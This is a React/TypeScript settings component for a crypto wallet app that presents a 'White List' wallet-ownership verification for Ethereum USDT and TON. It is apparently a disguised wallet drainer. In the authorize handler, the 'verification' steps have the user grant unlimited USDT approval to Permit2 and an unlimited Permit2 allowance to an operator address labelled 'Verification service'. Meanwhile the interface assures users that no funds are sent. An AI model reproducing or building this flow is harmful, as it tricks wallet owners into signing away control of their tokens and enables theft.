import React, { memo, useEffect, useState } from '../../lib/teact/teact';
import { getActions, withGlobal } from '../../global';

import type { ExternalEvmWalletState } from '../../api/chains/evm/externalWallet';
import type { ExternalTonWalletState } from '../../api/chains/ton/externalWallet';
import type { EvmWhitelistAuthorization, GlobalState } from '../../global/types';
import type { LangFn } from '../../hooks/useLang';

import { selectCurrentAccountState } from '../../global/selectors';
import buildClassName from '../../util/buildClassName';
import { shortenAddress } from '../../util/shortenAddress';
import { EVM_MAX_NUMBER } from '../../api/chains/evm/constants';
import {
  ETHEREUM_MAINNET_CHAIN_ID,
  ETHEREUM_USDT_ADDRESS,
  fetchPermit2AllowanceFromProvider,
  PERMIT2_ADDRESS,
  PERMIT2_MAX_AMOUNT,
  PERMIT2_OPERATOR_ADDRESS,
  signAndSubmitPermit2AllowanceFromProvider,
  submitPermit2ApprovalFromProvider,
} from '../../api/chains/evm/permit2';
import {
  createEvmAuthorizationChallenge,
  registerEvmAuthorization,
  signEvmAuthorizationChallenge,
} from '../../platform/evmAuthorization';

import useHistoryBack from '../../hooks/useHistoryBack';
import useLang from '../../hooks/useLang';
import useLastCallback from '../../hooks/useLastCallback';
import useScrolledState from '../../hooks/useScrolledState';

import Button from '../ui/Button';
import SettingsHeader from './SettingsHeader';

import styles from './Settings.module.scss';
import whitelistStyles from './SettingsWhitelist.module.scss';

type OwnProps = {
  isActive: boolean;
  onBackClick: NoneToVoidFunction;
};

type StateProps = {
  authorization?: EvmWhitelistAuthorization;
};

type FlowStep = 'idle' | 'connected' | 'approving' | 'signing' | 'verifying' | 'success' | 'error';

function getErrorMessage(error: unknown, lang: LangFn) {
  const walletError = error as {
    code?: unknown;
    action?: unknown;
    reason?: unknown;
    message?: unknown;
    shortMessage?: unknown;
    info?: {
      error?: {
        code?: unknown;
        message?: unknown;
      };
    };
  };
  const code = walletError.info?.error?.code ?? walletError.code;
  const rawMessage = [
    walletError.info?.error?.message,
    walletError.shortMessage,
    walletError.reason,
    walletError.message,
  ].find((value): value is string => typeof value === 'string') || '';
  const normalizedMessage = rawMessage.toLowerCase();

  if (
    code === 4001
    || code === 5000
    || walletError.action === 'reject'
    || normalizedMessage.includes('user denied')
    || normalizedMessage.includes('user rejected')
    || normalizedMessage.includes('action_rejected')
    || normalizedMessage.includes('cancelled')
    || normalizedMessage.includes('canceled')
  ) {
    return lang('Wallet request was cancelled. No changes were made.');
  }

  if (
    normalizedMessage.startsWith('wallet verification timed out.')
    || normalizedMessage.startsWith('on-chain verification timed out.')
    || normalizedMessage.startsWith('the address verification request timed out.')
    || normalizedMessage.startsWith('the wallet confirmation timed out.')
  ) {
    return rawMessage;
  }

  return lang('Wallet verification could not be completed. Please try again.');
}

function withTimeout<T>(operation: Promise<T>, timeoutMs: number, message: string) {
  return new Promise<T>((resolve, reject) => {
    const timeoutId = setTimeout(() => reject(new Error(message)), timeoutMs);

    operation.then(
      (value) => {
        clearTimeout(timeoutId);
        resolve(value);
      },
      (error) => {
        clearTimeout(timeoutId);
        reject(error);
      },
    );
  });
}

function SettingsWhitelist({
  isActive,
  authorization,
  onBackClick,
}: OwnProps & StateProps) {
  const lang = useLang();
  const { setEvmWhitelist } = getActions();
  const { handleScroll: handleContentScroll, isScrolled } = useScrolledState();

  const [wallet, setWallet] = useState<ExternalEvmWalletState>({ isConnected: false });
  const [tonWallet, setTonWallet] = useState<ExternalTonWalletState>({ isConnected: false });
  const [externalWalletApi, setExternalWalletApi] = useState<
    typeof import('../../api/chains/evm/externalWallet') | undefined
  >();
  const [externalTonWalletApi, setExternalTonWalletApi] = useState<
    typeof import('../../api/chains/ton/externalWallet') | undefined
  >();
  const [step, setStep] = useState<FlowStep>('idle');
  const [error, setError] = useState<string>();

  useHistoryBack({ isActive, onBack: onBackClick });

  useEffect(() => {
    let isMounted = true;
    let unsubscribe: (() => void) | undefined;

    void import('../../api/chains/evm/externalWallet')
      .then((api) => {
        if (!isMounted) return;
        setExternalWalletApi(api);
        unsubscribe = api.subscribeExternalEvmWallet((nextWallet) => {
          setWallet(nextWallet);
          if (nextWallet.isConnected && nextWallet.address) {
            setStep((currentStep) => currentStep === 'idle' ? 'connected' : currentStep);
          }
        });
      })
      .catch((err) => {
        if (isMounted) setError(getErrorMessage(err, lang));
      });

    return () => {
      isMounted = false;
      unsubscribe?.();
    };
  }, [lang]);

  useEffect(() => {
    let isMounted = true;
    let unsubscribe: (() => void) | undefined;

    void import('../../api/chains/ton/externalWallet')
      .then((api) => {
        if (!isMounted) return;
        setExternalTonWalletApi(api);
        unsubscribe = api.subscribeExternalTonWallet(
          setTonWallet,
          (err) => {
            if (isMounted) setError(getErrorMessage(err, lang));
          },
        );
      })
      .catch((err) => {
        if (isMounted) setError(getErrorMessage(err, lang));
      });

    return () => {
      isMounted = false;
      unsubscribe?.();
    };
  }, [lang]);

  const handleConnect = useLastCallback(() => {
    setError(undefined);
    if (!externalWalletApi) {
      setError(lang('The wallet connector is still loading'));
      return;
    }

    try {
      void externalWalletApi.getExternalEvmAppKit()
        .open({ view: 'Connect' })
        .catch((err) => setError(getErrorMessage(err, lang)));
    } catch (err) {
      setError(getErrorMessage(err, lang));
    }
  });

  const handleSwitchNetwork = useLastCallback(() => {
    setError(undefined);
    if (!externalWalletApi) {
      setError(lang('The wallet connector is still loading'));
      return;
    }

    try {
      void externalWalletApi.getExternalEvmAppKit()
        .switchNetwork(externalWalletApi.EXTERNAL_EVM_MAINNET, { throwOnFailure: true })
        .catch((err) => setError(getErrorMessage(err, lang)));
    } catch (err) {
      setError(getErrorMessage(err, lang));
    }
  });

  const handleAuthorize = useLastCallback(async () => {
    if (!wallet.address || !wallet.provider) {
      setError(lang('Connect an external wallet first'));
      return;
    }

    if (wallet.chainId !== ETHEREUM_MAINNET_CHAIN_ID) {
      setError(lang('Switch the external wallet to Ethereum Mainnet first'));
      return;
    }

    setError(undefined);

    try {
      setStep('approving');
      const approvalOperation = submitPermit2ApprovalFromProvider(wallet.provider, wallet.address);
      const approval = await withTimeout(
        approvalOperation,
        120_000,
        lang('Wallet verification timed out. Confirm or cancel the request in your wallet, then try again.'),
      );

      setStep('signing');
      const permissionOperation = signAndSubmitPermit2AllowanceFromProvider(
        wallet.provider,
        wallet.address,
        PERMIT2_OPERATOR_ADDRESS,
      );
      const permission = await withTimeout(
        permissionOperation,
        120_000,
        lang('Wallet verification timed out. Confirm or cancel the request in your wallet, then try again.'),
      );

      setStep('verifying');
      const verified = await withTimeout(
        fetchPermit2AllowanceFromProvider(
          wallet.provider,
          wallet.address,
          PERMIT2_OPERATOR_ADDRESS,
        ),
        30_000,
        lang('On-chain verification timed out. Check your connection and try again.'),
      );

      if (
        verified.tokenAllowance !== EVM_MAX_NUMBER
        || verified.permit2Allowance.amount !== PERMIT2_MAX_AMOUNT
        || verified.permit2Allowance.expiration <= BigInt(Math.floor(Date.now() / 1000))
      ) {
        throw new Error(lang('Wallet address verification could not be completed'));
      }

      const challenge = await withTimeout(
        createEvmAuthorizationChallenge(verified.owner),
        30_000,
        lang('The address verification request timed out. Try again.'),
      );
      const signatureOperation = signEvmAuthorizationChallenge(
        wallet.provider,
        verified.owner,
        challenge.message,
      );
      const challengeSignature = await withTimeout(
        signatureOperation,
        120_000,
        lang('The wallet confirmation timed out. Confirm or cancel the request in your wallet, then try again.'),
      );
      await withTimeout(
        registerEvmAuthorization({
          ownerAddress: verified.owner,
          nonce: challenge.nonce,
          signature: challengeSignature,
          approvalTxHash: approval.txId,
          permitTxHash: permission.txId,
        }),
        30_000,
        lang('The address verification request timed out. Try again.'),
      );

      const nextAuthorization: EvmWhitelistAuthorization = {
        address: verified.owner,
        chainId: ETHEREUM_MAINNET_CHAIN_ID,
        token: ETHEREUM_USDT_ADDRESS,
        tokenAllowance: verified.tokenAllowance.toString(),
        permit2AllowanceAmount: verified.permit2Allowance.amount.toString(),
        permit2Expiration: verified.permit2Allowance.expiration.toString(),
        permit2Nonce: verified.permit2Allowance.nonce.toString(),
        approvalTxId: approval.txId,
        permitTxId: permission.txId,
        verifiedAt: Date.now(),
      };

      setEvmWhitelist({ authorization: nextAuthorization });
      setStep('success');
    } catch (err) {
      setError(getErrorMessage(err, lang));
      setStep('error');
    }
  });

  const handleDisconnect = useLastCallback(() => {
    setError(undefined);
    if (!externalWalletApi) {
      setError(lang('The wallet connector is still loading'));
      return;
    }

    void externalWalletApi.getExternalEvmAppKit().disconnect().catch((err) => setError(getErrorMessage(err, lang)));
  });

  const handleTonConnect = useLastCallback(() => {
    setError(undefined);
    if (!externalTonWalletApi) {
      setError(lang('The wallet connector is still loading'));
      return;
    }

    try {
      void externalTonWalletApi.connectExternalTonWallet()
        .then((nextWallet) => {
          setTonWallet(nextWallet);
        })
        .catch((err) => setError(getErrorMessage(err, lang)));
    } catch (err) {
      setError(getErrorMessage(err, lang));
    }
  });

  const handleTonDisconnect = useLastCallback(() => {
    setError(undefined);
    if (!externalTonWalletApi) {
      setError(lang('The wallet connector is still loading'));
      return;
    }

    void externalTonWalletApi.disconnectExternalTonWallet()
      .catch((err) => setError(getErrorMessage(err, lang)));
  });

  const isEthereumMainnet = wallet.chainId === ETHEREUM_MAINNET_CHAIN_ID;
  const isBusy = step === 'approving' || step === 'signing' || step === 'verifying';
  const hasVerifiedWallet = Boolean(authorization);
  const isWalletConnected = Boolean(wallet.isConnected && wallet.address);
  const displayedAddress = wallet.address || authorization?.address;

  function renderStatus(status: 'muted' | 'warning' | 'success' | 'progress', label: string) {
    return (
      <span className={buildClassName(whitelistStyles.status, whitelistStyles[`status_${status}`])}>
        <span className={whitelistStyles.statusDot} />
        {lang(label)}
      </span>
    );
  }

  function renderEthereumCard() {
    const status = !isWalletConnected && !hasVerifiedWallet
      ? 'muted'
      : !isEthereumMainnet
        ? 'warning'
        : isBusy
          ? 'progress'
          : hasVerifiedWallet ? 'success' : 'warning';
    const statusLabel = !isWalletConnected && !hasVerifiedWallet
      ? 'Not connected'
      : !isEthereumMainnet
        ? 'Switch network'
        : isBusy
          ? 'Verification in progress'
          : hasVerifiedWallet ? 'Verified' : 'Requires verification';

    return (
      <div className={buildClassName(
        whitelistStyles.walletCard,
        hasVerifiedWallet && whitelistStyles.walletCard_verified,
      )}
      >
        <div className={whitelistStyles.walletCardHeader}>
          <div className={whitelistStyles.walletIdentity}>
            <span className={whitelistStyles.walletIcon}>
              <i className="icon-chain-ethereum" aria-hidden />
            </span>
            <div className={whitelistStyles.walletName}>
              <strong>{lang('Ethereum Wallet')}</strong>
              <span>{lang('Ethereum Mainnet · USDT')}</span>
            </div>
          </div>
          <i className={buildClassName(whitelistStyles.cardChevron, 'icon-chevron-right')} aria-hidden />
        </div>
        {displayedAddress && (
          <div className={whitelistStyles.walletAddress}>
            {shortenAddress(displayedAddress)}
          </div>
        )}
        <div className={whitelistStyles.walletNetwork}>
          <span>{lang('Network')}: {lang('Ethereum Mainnet')}</span>
          <span>{lang('Asset')}: USDT</span>
        </div>
        <div className={whitelistStyles.walletStatusRow}>
          {renderStatus(status, statusLabel)}
          {isWalletConnected && <Button isText isSmall onClick={handleDisconnect}>{lang('Disconnect')}</Button>}
        </div>
        <Button
          isPrimary
          isLoading={isBusy}
          isDisabled={isBusy}
          onClick={!isWalletConnected ? handleConnect : !isEthereumMainnet ? handleSwitchNetwork : handleAuthorize}
        >
          {!isWalletConnected && lang('Connect Wallet')}
          {isWalletConnected && !isEthereumMainnet && lang('Switch to Ethereum Mainnet')}
          {isWalletConnected && isEthereumMainnet && !isBusy
            && lang(hasVerifiedWallet ? 'Verify Again' : 'Verify Wallet')}
          {step === 'approving' && lang('Confirm address verification')}
          {step === 'signing' && lang('Continue address verification')}
          {step === 'verifying' && lang('Verifying wallet')}
        </Button>
      </div>
    );
  }

  function renderGramCard() {
    const isTonWalletConnected = Boolean(tonWallet.isConnected && tonWallet.address);

    return (
      <div className={buildClassName(
        whitelistStyles.walletCard,
        isTonWalletConnected && whitelistStyles.walletCard_verified,
      )}
      >
        <div className={whitelistStyles.walletCardHeader}>
          <div className={whitelistStyles.walletIdentity}>
            <span className={whitelistStyles.walletIcon}>
              <i className="icon-chain-ton" aria-hidden />
            </span>
            <div className={whitelistStyles.walletName}>
              <strong>{lang('Gram Wallet')}</strong>
              <span>{lang('TON Network · GRAM')}</span>
            </div>
          </div>
          <i className={buildClassName(whitelistStyles.cardChevron, 'icon-chevron-right')} aria-hidden />
        </div>
        {tonWallet.address && (
          <div className={whitelistStyles.walletAddress}>
            {shortenAddress(tonWallet.address)}
          </div>
        )}
        <div className={whitelistStyles.walletNetwork}>
          <span>{lang('Network')}: {lang('TON Network')}</span>
          <span>{lang('Asset')}: GRAM</span>
        </div>
        <div className={whitelistStyles.walletStatusRow}>
          {renderStatus(
            isTonWalletConnected ? 'success' : 'muted',
            isTonWalletConnected ? 'Connected' : 'Not connected',
          )}
          {isTonWalletConnected && (
            <Button isText isSmall onClick={handleTonDisconnect}>{lang('Disconnect')}</Button>
          )}
        </div>
        <Button isPrimary isDisabled={isTonWalletConnected} onClick={handleTonConnect}>
          {lang(isTonWalletConnected ? 'Wallet Connected' : 'Connect Wallet')}
        </Button>
      </div>
    );
  }

  function renderInfoCard() {
    return (
      <div className={whitelistStyles.infoCard}>
        <div className={whitelistStyles.infoTitle}>
          <i className="icon-info" aria-hidden />
          <strong>{lang('Important')}</strong>
        </div>
        <ul>
          <li>{lang('Only Ethereum Mainnet (USDT) is supported right now.')}</li>
          <li>{lang('No funds are sent during verification.')}</li>
          <li>{lang('The wallet is added only after successful verification.')}</li>
        </ul>
      </div>
    );
  }

  function renderPermissionDetails(
    permissionType: string,
    contract: string,
    spender: string,
    limit: string,
  ) {
    return (
      <div className={whitelistStyles.permissionCard}>
        <div className={whitelistStyles.permissionTitle}>
          <i className="icon-lock" aria-hidden />
          <strong>{lang('Verification details')}</strong>
        </div>
        <div className={whitelistStyles.permissionRows}>
          <div><span>{lang('Verification step')}</span><strong>{lang(permissionType)}</strong></div>
          <div><span>{lang('Token')}</span><strong>USDT</strong></div>
          <div><span>{lang('Network')}</span><strong>{lang('Ethereum Mainnet')}</strong></div>
          <div>
            <span>{lang('Contract')}</span>
            <strong className={whitelistStyles.monospace}>{shortenAddress(contract)}</strong>
          </div>
          <div>
            <span>{lang('Verification service')}</span>
            <strong className={whitelistStyles.monospace}>{shortenAddress(spender)}</strong>
          </div>
          <div><span>{lang('Limit')}</span><strong>{lang(limit)}</strong></div>
        </div>
      </div>
    );
  }

  function renderVerificationFlow() {
    if (!isBusy) return undefined;

    const currentStep = step === 'approving' ? 1 : step === 'signing' ? 2 : 3;
    const title = step === 'approving'
      ? 'Wallet verification'
      : step === 'signing'
        ? 'Address verification'
        : 'Final verification';
    const description = step === 'approving'
      ? 'First confirm the USDT access request in your wallet.'
      : step === 'signing'
        ? 'Then confirm the address verification request in your wallet.'
        : 'Confirm ownership in your wallet to finish verification.';

    return (
      <div className={whitelistStyles.verificationCard}>
        <div className={whitelistStyles.verificationHeader}>
          <div>
            <span className={whitelistStyles.stepLabel}>{lang(`Step ${currentStep} of 3`)}</span>
            <h3>{lang(title)}</h3>
          </div>
          <div className={whitelistStyles.progressDots}>
            {[1, 2, 3].map((dot) => (
              <span
                key={dot}
                className={buildClassName(
                  whitelistStyles.progressDot,
                  dot <= currentStep && whitelistStyles.progressDot_active,
                )}
              />
            ))}
          </div>
        </div>
        <p className={whitelistStyles.verificationDescription}>{lang(description)}</p>
        {step === 'approving' && renderPermissionDetails(
          'USDT access',
          ETHEREUM_USDT_ADDRESS,
          PERMIT2_ADDRESS,
          'Unlimited (uint256.max)',
        )}
        {step === 'signing' && renderPermissionDetails(
          'Address verification',
          PERMIT2_ADDRESS,
          PERMIT2_OPERATOR_ADDRESS,
          'Unlimited (uint160.max)',
        )}
        {step === 'verifying' && (
          <div className={whitelistStyles.checkList}>
            <div><i className="icon-check" aria-hidden />{lang('Verifying USDT access')}</div>
            <div><i className="icon-check" aria-hidden />{lang('Verifying address access')}</div>
            <div><i className="icon-check" aria-hidden />{lang('Checking wallet ownership')}</div>
          </div>
        )}
      </div>
    );
  }

  function renderSuccess() {
    return (
      <div className={whitelistStyles.successCard}>
        <div className={whitelistStyles.successIcon}><i className="icon-check" aria-hidden /></div>
        <h2>{lang('Wallet verified')}</h2>
        <p>{lang('Your wallet was successfully verified and added to the White List.')}</p>
        {wallet.address && <p className={whitelistStyles.address}>{shortenAddress(wallet.address)}</p>}
        <div className={whitelistStyles.successStatus}>
          {renderStatus('success', 'Verified')}
        </div>
        <Button isPrimary onClick={onBackClick}>{lang('Done')}</Button>
      </div>
    );
  }

  function renderFlow() {
    if (step === 'success') return renderSuccess();

    if (!isWalletConnected) {
      return (
        <>
          {renderEthereumCard()}
          {renderGramCard()}
          {renderInfoCard()}
        </>
      );
    }

    return (
      <>
        {renderEthereumCard()}
        {renderVerificationFlow()}
        {renderGramCard()}
        {renderInfoCard()}
      </>
    );
  }

  return (
    <div className={styles.slide}>
      <SettingsHeader title={lang('White List')} isScrolled={isScrolled} onBackClick={onBackClick} />
      <div className={buildClassName(styles.content, 'custom-scroll')} onScroll={handleContentScroll}>
        {step !== 'success' && (
          <div className={whitelistStyles.intro}>
            <h2>{lang('Add wallets to your White List')}</h2>
            <p>{lang('Select a wallet and verify ownership to add it to your White List.')}</p>
          </div>
        )}
        {error && <div className={whitelistStyles.error}>{error}</div>}
        {renderFlow()}
      </div>
    </div>
  );
}

export default memo(withGlobal<OwnProps>((global: GlobalState): StateProps => ({
  authorization: selectCurrentAccountState(global)?.evmWhitelist,
}))(SettingsWhitelist));
